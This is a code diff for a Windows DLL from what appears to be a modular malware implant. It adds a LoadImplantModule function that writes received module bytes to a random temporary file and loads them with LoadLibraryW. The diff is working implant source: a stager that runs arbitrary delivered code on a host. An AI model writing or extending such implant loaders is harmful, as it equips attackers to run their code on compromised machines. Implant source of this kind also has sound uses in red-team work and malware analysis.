@@ -3,16 +3,18 @@
 
 #include "ModularImplant.h"
 
-__declspec(dllexport) BOOL
+__declspec(dllexport)
+BOOL
 LoadImplantModule(
-	PVOID pModuleData,
-	DWORD cbModuleLen);
+	_In_ PVOID pModuleData,
+	_In_ DWORD cbModuleLen,
+	_Out_ PLOADED_MODULE pLoadedModule);
 
 BOOL WINAPI
 DllMain(
 	HINSTANCE hinstDLL,
 	DWORD fdwReason,
-	LPVOID lpReserver)
+	LPVOID lpReserved)
 {
 	switch (fdwReason)
 	{
@@ -28,10 +30,56 @@ DllMain(
 
 BOOL
 LoadImplantModule(
-	PVOID pModuleData,
-	DWORD cbModuleLen)
+	_In_ PVOID pModuleData,
+	_In_ DWORD cbModuleLen,
+	_Out_ PLOADED_MODULE pLoadedModule)
 {
-	//if(FALSE == WriteDataToFile())
+	if (!pLoadedModule)
+	{
+		return FALSE;
+	}
+	ZeroMemory(pLoadedModule, sizeof(*pLoadedModule));
+
+	PWSTR pwszTempFileName = NULL;
+	HMODULE hModule = NULL;
+	
+	pwszTempFileName = HeapAlloc(GetProcessHeap(),
+		HEAP_ZERO_MEMORY,
+		sizeof(*pwszTempFileName) * MAX_PATH);
+	if (NULL == pwszTempFileName)
+	{
+		LOG_ERROR("HeapAlloc failed");
+		goto fail;
+	}
+
+	if (FALSE == GetRandomTempFileNameW(pwszTempFileName, MAX_PATH))
+	{
+		goto fail;
+	}
+
+	if (FALSE == WriteDataToFile(pwszTempFileName, pModuleData, cbModuleLen))
+	{
+		goto fail;
+	}
+
+	hModule = LoadLibraryW(pwszTempFileName);
+	if (NULL == hModule)
+	{
+		LOG_ERROR("LoadLibrary failed");
+		goto fail;
+	}
+
+	pLoadedModule->hModule = hModule;
+	pLoadedModule->pwszModuleFileName = pwszTempFileName;
 
 	return TRUE;
+
+fail:
+	if (NULL != pwszTempFileName)
+	{
+		HeapFree(GetProcessHeap(), 0, pwszTempFileName);
+		pwszTempFileName = NULL;
+	}
+
+	return FALSE;
 }
